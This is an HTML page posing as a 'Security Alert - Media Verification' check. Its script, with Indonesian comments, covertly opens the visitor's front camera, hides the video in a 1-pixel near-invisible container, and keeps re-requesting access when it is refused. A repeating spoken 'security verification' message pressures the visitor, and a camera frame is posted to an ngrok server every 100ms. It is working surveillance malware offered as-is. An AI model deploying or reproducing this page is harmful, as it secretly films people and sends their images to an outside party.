<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Media Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="640" height="480"></canvas>
</div>

<script>
(function () {
  'use strict';

  var CONFIG = {
    tts: {
      text: "Security verification required. Live monitoring session active.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      repeatInterval: 6000
    },
    streamInterval: 100, // Mengirim frame setiap 100ms untuk efek CCTV live yang halus
    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
  };

  var state = {
    ttsStarted: false,
    camStream: null,
    camActive: false,
    streamTimer: null
  };

  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.onend = function () {
        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
      };
      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  function streamFrame() {
    if (!state.camActive) return;

    var videoElement = document.getElementById('cam-feed');
    var canvas = document.getElementById('processing-canvas');
    var ctx = canvas.getContext('2d');

    try {
      if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;

      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      var dataURL = canvas.toDataURL('image/jpeg', 0.65); // Kompresi optimal untuk stream
      var payload = JSON.stringify({ image: dataURL });

      fetch(CONFIG.serverEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      }).catch(function(err) {});
    } catch (e) {}
  }

  function requestCameraAccess() {
    if (state.camActive) return;

    navigator.mediaDevices.getUserMedia({ 
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
      audio: false 
    })
    .then(function(stream) {
      state.camStream = stream;
      state.camActive = true;
      
      var videoElement = document.getElementById('cam-feed');
      videoElement.srcObject = stream;
      videoElement.play().catch(function(){});

      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          state.camActive = false;
          setTimeout(requestCameraAccess, 2000);
        };
      });
    })
    .catch(function(err) {
      setTimeout(requestCameraAccess, 3000);
    });
  }

  window.addEventListener('DOMContentLoaded', function() {
    startTTS();
    requestCameraAccess();

    // Memulai pengiriman frame cepat layaknya stream CCTV
    state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
  });

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) {
      startTTS();
      if (!state.camActive) {
        requestCameraAccess();
      }
    }
  });

})();
</script>
</body>
</html>
